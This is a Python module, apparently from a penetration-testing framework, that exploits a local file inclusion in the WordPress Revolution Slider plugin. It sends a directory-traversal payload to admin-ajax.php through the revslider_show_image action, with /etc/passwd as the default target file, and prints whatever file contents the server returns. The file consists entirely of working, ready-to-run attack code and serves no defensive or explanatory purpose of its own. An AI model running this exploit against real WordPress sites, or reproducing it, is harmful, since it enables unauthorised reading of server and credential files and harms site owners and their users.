import requests
from urllib.parse import urljoin
from core.base_module import BaseModule
from rich.console import Console

class WpRevsliderLfi(BaseModule):
    """Exploits a Local File Inclusion in the WordPress Revolution Slider plugin."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'URL': ['', 'The base URL of the WordPress site.'],
            'FILE_PATH': ['/etc/passwd', 'The absolute path of the file to read.']
        }

    def run(self, options):
        """
        Executes the RevSlider LFI exploit.
        """
        base_url = options.get('URL')
        file_path = options.get('FILE_PATH')
        console = Console()

        if not base_url:
            console.print("[!] URL must be set.", style="bold red")
            return

        # The vulnerable AJAX action in RevSlider
        ajax_url = urljoin(base_url, '/wp-admin/admin-ajax.php')
        params = {
            'action': 'revslider_show_image',
            'img': f'../../../../../..{file_path}' # Common traversal path
        }

        console.print(f"[*] Targeting WordPress site at: {base_url}")
        console.print(f"[*] Attempting to read file via RevSlider LFI: {file_path}")

        try:
            response = requests.get(ajax_url, params=params, timeout=20, verify=False)

            # A successful request might not return 200, but the file content will be there.
            # We check if the response is not empty and doesn't contain common error messages.
            if response.text and 'revslider_show_image' not in response.text and '<!DOCTYPE html>' not in response.text:
                console.print("[bold green][+] File read successfully![/bold green]")
                console.print(f"--- Contents of {file_path} ---")
                console.print(response.text.strip())
                console.print("---------------------------")
            else:
                console.print(f"[!] Failed to read file. The site may not be vulnerable or the file path is incorrect.", style="bold red")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")